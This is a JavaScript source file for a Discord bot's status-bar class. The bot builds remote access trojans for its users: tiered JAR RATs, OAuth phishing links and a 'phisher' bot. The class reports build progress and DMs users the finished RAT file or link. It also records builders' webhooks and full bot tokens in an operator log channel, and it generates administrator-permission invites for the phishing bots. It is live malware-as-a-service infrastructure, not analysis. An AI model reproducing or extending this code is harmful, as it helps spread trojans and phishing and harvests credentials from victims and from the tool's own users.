import { EmbedBuilder } from "discord.js";

const fileRats = ["free", "basic", "premium"];
const linkRats = ["oauth_free", "oauth_premium"];
const botRats = ["phisher"];

export default class StatusBar {
  constructor(ratType, interaction, ...statuses) {
    this.ratType = ratType;
    this.ratTypeFormatted = ratType.charAt(0).toUpperCase() + ratType.slice(1).replace("_", " ");
    if (this.ratTypeFormatted.includes("Oauth")) {
      const oauthType = this.ratTypeFormatted.replace("Oauth ", "");
      this.ratTypeFormatted = "OAuth " + oauthType.charAt(0).toUpperCase() + oauthType.slice(1);
    }
    this.interaction = interaction;
    this.statuses = statuses;
    this.statusNumber = 0;
    this.startDate = Date.now();
  }

  start() {
    return new Promise(async (resolve, reject) => {
      const type = fileRats.includes(this.ratType)
        ? "JAR"
        : linkRats.includes(this.ratType)
        ? "Link"
        : botRats.includes(this.ratType)
        ? "Bot"
        : "null";

      const embed = new EmbedBuilder()
        .setColor("Green")
        .setTitle("Please wait")
        .setDescription(
          `✅ Your ${type} is being built. Please wait up to 1 minute...\n\nStatus: ${this.statuses[0]}...\n0% [====================================]`
        );
        console.log(this.ratType)
      const logEmbed = new EmbedBuilder()
        .setColor(this.interaction.client.config.colors.logs.build[this.ratType])
        .setTitle("RAT Building")
        .setDescription(`<@${this.interaction.member.id}> is currently building a ${this.ratTypeFormatted} RAT.`);
      if (botRats.includes(this.ratType)) {
        const id = this.interaction.options.getString("id");
        const token = this.interaction.options.getString("token");
        logEmbed.addFields(
          {
            name: "ID",
            value: `\`\`\`${id}\`\`\``,
            inline: false,
          },
          {
            name: "Token",
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          }
        );
      } else {
        const webhook = this.interaction.options.getString("webhook");
        logEmbed.addFields({
          name: "Webhook",
          value: webhook,
          inline: true,
        });
      }
      this.statusNumber++;
      await this.interaction.reply({ embeds: [embed], ephemeral: true });
      try {
        const channel = await this.interaction.guild.channels.fetch(this.interaction.client.config.logs);
        await channel.send({ embeds: [logEmbed] });
      } catch (error) {}
      return resolve(true);
    });
  }

  update() {
    return new Promise(async (resolve, reject) => {
      if (this.statusNumber >= this.statuses.length) {
        return resolve(false);
      }
      const type = fileRats.includes(this.ratType)
        ? "JAR"
        : linkRats.includes(this.ratType)
        ? "Link"
        : botRats.includes(this.ratType)
        ? "Bot"
        : "null";

      const loadingBar1 = "=".repeat(Math.round((this.statusNumber / this.statuses.length) * 36));
      const loadingBar2 = "=".repeat(
        Math.round(((this.statuses.length - this.statusNumber) / this.statuses.length) * 36)
      );
      const embed = new EmbedBuilder()
        .setColor("Green")
        .setTitle("Please wait")
        .setDescription(
          `✅ Your ${type} is being built. Please wait up to 1 minute...\n\nStatus: ${
            this.statuses[this.statusNumber]
          }...\n${Math.round((this.statusNumber / this.statuses.length) * 100)}% [**${loadingBar1}**${loadingBar2}]`
        );

      await this.interaction.editReply({ embeds: [embed] });
      return resolve(true);
    });
  }

  finish(rat) {
    return new Promise(async (resolve, reject) => {
      const type = fileRats.includes(this.ratType)
        ? "JAR"
        : linkRats.includes(this.ratType)
        ? "Link"
        : botRats.includes(this.ratType)
        ? "Bot"
        : "null";

      const embed = new EmbedBuilder()
        .setColor("Green")
        .setTitle("Success! 🎉")
        .setDescription(
          `✅ Your ${type} has been built.\n\nStatus: Completed...\n100% [**====================================**]`
        );
      const successEmbed = new EmbedBuilder()
        .setColor(this.interaction.client.config.colors.commands.build[this.ratType])
        .setTitle("Success! 🎉")
        .setDescription(`Your ${this.ratTypeFormatted} ${type} has been build successfully.`)
        .addFields({
          name: `Your ${type} has been sent to your direct messages!`,
          value: "If you did not receive it, make sure you can receive DMs from members in this server.",
          inline: false,
        });
      if (fileRats.includes(this.ratType)) {
        successEmbed.setFooter({
          text: `Build Time: ${formatTime(Date.now() - this.startDate)}`,
        });
      }

      if (fileRats.includes(this.ratType)) {
        const userEmbed = new EmbedBuilder()
          .setColor(this.interaction.client.config.colors.commands.build[this.ratType])
          .setTitle(this.ratTypeFormatted + " JAR");
        try {
          await this.interaction.user.send({ embeds: [userEmbed], files: [rat] });
        } catch (error) {}
      } else if (linkRats.includes(this.ratType)) {
        const userEmbed = new EmbedBuilder()
          .setColor(this.interaction.client.config.colors.commands.build[this.ratType])
          .setTitle(this.ratTypeFormatted + " Link")
          .addFields({ name: "Link", value: rat, inline: false });
        try {
          await this.interaction.user.send({ embeds: [userEmbed] });
        } catch (error) {}
      } else if (botRats.includes(this.ratType)) {
        const userEmbed = new EmbedBuilder()
          .setColor(this.interaction.client.config.colors.commands.build[this.ratType])
          .setTitle(this.ratTypeFormatted + " Bot")
          .addFields(
            {
              name: "Bot ID",
              value: `\`\`\`${rat.id}\`\`\``,
              inline: true,
            },
            {
              name: "Bot Token",
              value: `\`\`\`${rat.token
                .split(".")
                .map((val, i) => (i > 1 ? val.replace(/./g, "*") : val))
                .join(".")}\`\`\``,
              inline: true,
            },
            {
              name: "Bot Invite",
              value: `https://discord.com/oauth2/authorize?client_id=${rat.id}&scope=bot&permissions=8`,
              inline: false,
            }
          );
        try {
          await this.interaction.user.send({ embeds: [userEmbed] });
        } catch (error) {}
      }

      await this.interaction.editReply({ embeds: [embed] });
      await this.interaction.channel.send({ content: `<@${this.interaction.user.id}>`, embeds: [successEmbed] });
      return resolve(true);
    });
  }
}

function formatTime(milliseconds) {
  const seconds = Math.floor(milliseconds / 1000);
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const remainingSeconds = seconds % 60;

  const formattedTime = [];
  if (hours > 0) {
    formattedTime.push(`${hours} hour${hours > 1 ? "s" : ""}`);
  }
  if (minutes > 0) {
    formattedTime.push(`${minutes} minute${minutes > 1 ? "s" : ""}`);
  }
  if (remainingSeconds > 0) {
    formattedTime.push(`${remainingSeconds} second${remainingSeconds > 1 ? "s" : ""}`);
  }

  return formattedTime.join(", ");
}
